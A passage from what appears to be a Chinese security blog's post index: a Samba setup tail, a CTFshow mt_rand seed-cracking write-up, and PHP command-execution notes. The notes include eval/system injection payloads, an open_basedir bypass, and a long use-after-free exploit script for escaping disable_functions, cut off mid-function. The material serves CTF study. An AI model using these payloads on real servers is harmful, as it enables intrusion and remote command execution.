class="line">  gensec_spnego_server_negTokenTarg_step: SPNEGO(ntlmssp) login failed: NT_STATUS_WRONG_PASSWORD</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210911190645705.png" alt="image-20210911190645705"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://cn.linux.vbird.org/linux_server/0370samba_1.php">第十六章、文件服务器之二： SAMBA 服务器</a></p><p><a href="https://cshihong.github.io/2018/10/18/Samba%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/">Samba服务器搭建与配置</a></p><p><a href="https://blog.csdn.net/sinat_35850783/article/details/100776590">samba启动失败</a></p><p><a href="https://blog.51cto.com/1992tao/1863682">文件共享服务—Samba</a></p><p><a href="https://huiliu.github.io/2016/01/19/samba_basic.html">Samba</a></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mt_srand()种子和mt_rand()随机数</title>
      <link href="/p/730fc708.html"/>
      <url>/p/730fc708.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>来自CTFSshow-WEB24</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先测试<code>r=0</code>,网页回显<code>-1387662750</code>，得到随机数<code>mt_rand()=1387662750</code></p><p>由于要让<code>!$rand</code>条件成立，获取flag的<code>r=1387662750</code></p><p><a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">php_mt_seed 4.0</a></p><p>下载编译</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909124135307.png" alt="image-20210909124135307"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909124106797.png" alt="image-20210909124106797"></p><p>在<code>mt_rand()</code>相加前，<code>intval($r)-intval(mt_rand());</code>就调用过一次<code>mt_rand()</code>，所以才有中间的，<code>echo mt_rand().&quot;\n&quot;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">2704363133</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand()+mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>添加cookie到数据包</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909124222921.png" alt="image-20210909124222921"></p><h2 id="题目原理"><a href="#题目原理" class="headerlink" title="题目原理"></a>题目原理</h2><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</p><p>生成伪随机数是线性的，你可以理解为y=ax,x就是种子，知道种子和一组伪随机数不是就可以推y(伪随机数）</p><p>如题目，让<code>r=0</code>就知道y的第一个确定值，通过爆破a，就能确定种子</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909125628570.png" alt="image-20210909125628570"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php命令执行</title>
      <link href="/p/604e4b25.html"/>
      <url>/p/604e4b25.html</url>
      
        <content type="html"><![CDATA[<p>应用有时需要调用一些执行系统命令的函数，如PHP中的<code>system</code>、<code>exec</code>、<code>shell_exec</code>、 <code>passthru</code>、<code>popen</code>、<code>proc_popen</code>等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击。</p><p><a href="http://php.net/manual/zh/ref.exec.php">PHP程序执行函数</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line">exec — 执行一个外部程序</span><br><span class="line">passthru — 执行外部程序并且显示原始输出</span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码</span><br><span class="line">proc_get_status — 获取由 proc_open 函数打开的进程的信息</span><br><span class="line">proc_nice — 修改当前进程的优先级</span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。</span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程</span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line">system — 执行外部程序，并且显示输出</span><br></pre></td></tr></table></figure><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ul><li><p>代码层过滤不严</p><ul><li>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：<code>system(&quot;/bin/program –arg $arg&quot;);</code></li></ul></li><li><p>系统的漏洞造成命令注入</p><ul><li>bash破壳漏洞(CVE-2014-6271)</li></ul></li><li><p>调用的第三方组件存在代码执行漏洞</p><ul><li>如WordPress中用来处理图片的ImageMagick组件</li><li>JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)</li><li>ThinkPHP命令执行</li></ul></li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li><p>应用调用执行系统命令的函数</p></li><li><p>将用户输入作为系统命令函数的参数拼接到了命令行中</p></li><li><p>没有对用户输入进行过滤或过滤不严</p></li></ul><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ul><li><p>继承Web服务程序的权限去执行系统命令或读写文件</p></li><li><p>反弹shell</p></li><li><p>控制整个网站甚至控制服务器</p></li><li><p>进一步内网渗透</p></li></ul><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h3 id="windows管道符"><a href="#windows管道符" class="headerlink" title="windows管道符"></a>windows管道符</h3><p><code>|</code>直接执行后面的语句。</p><p><code>||</code>如果前面的语句执行失败，则执行后面的语句，<strong>前面的语句只能为假</strong>。</p><p><code>&amp;</code>两条命令都执行，如果前面的语句为假则直接执行后面的语句，<strong>前面的语句可真可假</strong>。</p><p><code>&amp;&amp;</code>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，<strong>前面的语句只能为真</strong>。</p><h3 id="linux管道符"><a href="#linux管道符" class="headerlink" title="linux管道符"></a>linux管道符</h3><p><code>;</code>执行完前面的语句再执行后面的语句。</p><p><code>|</code><strong>显示</strong>后面语句的执行结果。</p><p><code>||</code>当前面的语句执行出错时，执行后面的语句，<strong>前面的语句只能为假</strong>。</p><p><code>&amp;</code>两条命令都执行，如果前面的语句为假则执行执行后面的语句，<strong>前面的语句可真可假</strong>。</p><p><code>&amp;&amp;</code>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，<strong>前面的语句只能为真</strong>。</p><h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号(``)"></a>反引号<code>(``)</code></h2><p>注意这不是单引号！PHP 将尝试将<strong>反引号中的内容作为 shell 命令来执行</strong>，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符的效果与函数 <code>shell_exec()</code> 相同。</p><h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><p><code>&lt;? php</code> 可替换为 <code>&lt;?=</code></p><p>在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。</p><p>所以就需要构造<code>?&gt;&lt;?=ls;</code></p><h2 id="传参逃逸"><a href="#传参逃逸" class="headerlink" title="传参逃逸"></a>传参逃逸</h2><p><code>1=</code>后出现的命令可以不受影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913205727442.png" alt="image-20210913205727442"></p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="php函数读取系统文件"><a href="#php函数读取系统文件" class="headerlink" title="php函数读取系统文件"></a>php函数读取系统文件</h2><table><thead><tr><th>函数</th><th>是否需要echo</th></tr></thead><tbody><tr><td>file_get_content()</td><td>需要</td></tr><tr><td>readfile()</td><td></td></tr><tr><td>highlight_file()</td><td>不需要</td></tr><tr><td>show_source()</td><td>不需要</td></tr><tr><td>include()</td><td>不需要，需要echo变量</td></tr></tbody></table><p><strong>include包含,echo输出</strong></p><p><code>c=include(&#39;flag.php&#39;);echo $flag.php;</code></p><p><strong>当不知道变量名称</strong>，包含后输出所有变量名称</p><p><code>c=include(&#39;flag.php&#39;);var_dump(get_defined_vars());</code></p><p><strong>写shell到文件日志文件中，读取日志文件拿shell</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913211117029.png" alt="image-20210913211117029"></p><h3 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h3><p>open_basedir 将php所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p><h4 id="glob-伪协议绕过open-basedir"><a href="#glob-伪协议绕过open-basedir" class="headerlink" title="glob://伪协议绕过open_basedir"></a>glob://伪协议绕过open_basedir</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>需要url编码</p></blockquote><h4 id="uaf脚本"><a href="#uaf脚本" class="headerlink" title="uaf脚本"></a>uaf脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span 